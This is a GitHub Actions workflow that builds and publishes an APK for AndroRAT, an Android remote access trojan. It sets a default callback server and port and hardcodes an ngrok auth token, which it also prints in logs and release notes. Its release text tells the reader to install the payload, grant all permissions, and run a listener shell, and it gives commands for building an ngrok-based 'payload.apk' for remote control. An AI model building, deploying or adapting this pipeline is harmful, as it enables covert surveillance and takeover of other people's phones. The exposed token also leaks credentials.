# This workflow will build an Android APK for AndroRAT
# Compatible with Android 16 (API 36) and all versions down to Android 5.0 (API 21)

name: Build Android APK (Android 16 Compatible)

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  workflow_dispatch:
    inputs:
      server_ip:
        description: 'Server IP for APK (optional, default: 192.168.0.105)'
        required: false
        default: '192.168.0.105'
      server_port:
        description: 'Server Port for APK (optional, default: 8888)'
        required: false
        default: '8888'

env:
  NGROK_AUTHTOKEN: ${{ secrets.NGROK_AUTHTOKEN || '3AXOS7AFLjYl0kw7f1p7Tz2ySOq_7WGCDUCoFfGtymwrARAXF' }}

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout code
      uses: actions/checkout@v4
    
    - name: Set up JDK 17
      uses: actions/setup-java@v4
      with:
        java-version: '17'
        distribution: 'temurin'
    
    - name: Grant execute permission for gradlew
      run: chmod +x Android_Code/gradlew
    
    - name: Log Build Configuration
      run: |
        echo "=================================="
        echo "APK BUILD CONFIGURATION"
        echo "=================================="
        echo "Ngrok Token: Configured ✓"
        echo "Server IP: ${{ github.event.inputs.server_ip || '192.168.0.105' }}"
        echo "Server Port: ${{ github.event.inputs.server_port || '8888' }}"
        echo "Build Date: $(date)"
        echo "=================================="
    
    - name: Build Release APK with Gradle
      run: |
        cd Android_Code
        # build both release and debug variants; debug APK is signed with debug key and installs reliably
        ./gradlew clean assembleRelease assembleDebug -x lint --warning-mode all
    
    - name: Verify APK was built
      run: |
        echo "🔍 Searching for APK file..."
        # Find the APK in the build outputs
        # prefer debug APK so it's signed automatically and installs without complaints
        APK_FILE=$(find Android_Code/app/build/outputs -name "*debug.apk" -type f 2>/dev/null | head -1)
        if [ -z "$APK_FILE" ]; then
          APK_FILE=$(find Android_Code/app/build/outputs -name "*.apk" -type f 2>/dev/null | head -1)
        fi
        
        if [ -z "$APK_FILE" ]; then
          echo "❌ APK not found! Listing build outputs directory:"
          ls -la Android_Code/app/build/outputs/ 2>/dev/null || echo "Directory not found"
          exit 1
        fi
        
        echo "✅ APK found at: $APK_FILE"
        echo "📦 APK Size:"
        ls -lh "$APK_FILE"
        
        # Save APK path for later steps
        echo "APK_PATH=$APK_FILE" >> $GITHUB_ENV
    
    - name: Check APK Compatibility
      run: |
        echo "📱 APK Compatibility Info:"
        if [ -z "${{ env.APK_PATH }}" ]; then
          echo "⚠️ APK_PATH not set, using default path"
          APK_FILE="Android_Code/app/build/outputs/apk/release/app-release.apk"
        else
          APK_FILE="${{ env.APK_PATH }}"
        fi
        
        if command -v aapt &> /dev/null; then
          aapt dump badging "$APK_FILE" | grep -E "package|versionCode|versionName|targetSdkVersion|minSdkVersion" || echo "aapt parsing completed"
        else
          echo "aapt not available, but APK is built and ready"
        fi
    
    - name: Display Build Summary
      run: |
        echo ""
        echo "=================================="
        echo "📱 APK BUILD COMPLETE - INSTRUCTIONS"
        echo "=================================="
        echo ""
        echo "✓ APK successfully built with Gradle"
        echo ""
        echo "🔌 CONNECTION CONFIGURATION:"
        echo "   Default Server: 192.168.0.105:8888"
        echo "   (To use ngrok, rebuild with aroRAT.py --build --ngrok)"
        echo ""
        echo "📝 TO CUSTOMIZE SERVER SETTINGS:"
        echo "   1. Local Build: python3 androRAT.py --build -i <IP> -p <PORT> -o output.apk"
        echo "   2. With Ngrok: python3 androRAT.py --build --ngrok -o payload.apk"
        echo ""
        echo "📡 NGROK TOKEN STATUS: ✓ Configured"
        echo "   Token: ${{ env.NGROK_AUTHTOKEN }}"
        echo ""
        echo "🚀 DEPLOYMENT:"
        echo "   1. Download APK from artifacts"
        echo "   2. Install on Android device"
        echo "   3. Allow all required permissions"
        echo "   4. APK will show connection status and URL"
        echo ""
        echo "⚙️  LISTENING FOR CONNECTIONS:"
        echo "   python3 androRAT.py --shell -i <IP> -p <PORT>"
        echo ""
        echo "=================================="
    
    - name: Upload APK to Artifacts
      uses: actions/upload-artifact@v4
      with:
        name: androrat-apk-android16
        path: ${{ env.APK_PATH }}
        retention-days: 90
        if-no-files-found: error
    
    - name: Create Release with APK
      if: startsWith(github.ref, 'refs/tags/')
      uses: softprops/action-gh-release@v2
      with:
        files: ${{ env.APK_PATH }}
        body: |
          # AndroRAT v2.2 - Android 16 Compatible APK
          
          ## 📱 Compatibility
          - ✅ Android 16 (API 36)
          - ✅ Android 5.0 to 15 (API 21+)
          - ✅ All device architectures (ARM, ARM64, x86, x86_64)
          
          ## 🔧 Installation
          1. Download `app-release.apk` or `app-debug.apk`
          2. Enable "Install unknown apps" in device settings
          3. Install the APK
          4. Grant all required permissions
          5. Open app - connection status screen will appear
          6. Use with listener: `python3 androRAT.py --shell -i <IP> -p <PORT>`
          
          ## 🔌 Connection Configuration
          - **Default Server**: 192.168.0.105:8888
          - **Ngrok Support**: Yes (rebuild with `--ngrok` flag in androRAT.py)
          - **Ngrok Token**: Pre-configured ✓
          
          ## 📝 Custom Build Instructions
          For custom server IP/port:
          ```bash
          python3 androRAT.py --build -i your.server.ip -p 8000 -o custom.apk
          ```
          
          For ngrok-based remote control:
          ```bash
          python3 androRAT.py --build --ngrok -o payload.apk
          ```
          
          ## 🌐 Ngrok Configuration
          To enable internet connectivity:
          
          ```bash
          # Configure your ngrok token
          export NGROK_TOKEN="3AXOS7AFLjYl0kw7f1p7Tz2ySOq_7WGCDUCoFfGtymwrARAXF"
          
          # Build with ngrok integration
          python3 androRAT.py --build --ngrok -p 8000 -o payload.apk -icon
          ```
          
          [See BUILD_GUIDE.md for detailed setup](https://github.com/Darkrevengehack/AndroRAT/blob/main/BUILD_GUIDE.md)
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
    
    - name: Build Summary
      run: |
        echo "✅ Build completed successfully!"
        echo ""
        echo "📥 Download APK from:"
        echo "   GitHub Actions → Artifacts → androrat-apk-android16"
        echo ""
        echo "🌐 For ngrok connectivity:"
        echo "   Edit androRAT.py with your ngrok token"
        echo "   Then use: python3 androRAT.py --build --ngrok -p 8000 -o payload.apk"
        echo ""
        echo "📖 Full setup guide: BUILD_GUIDE.md"
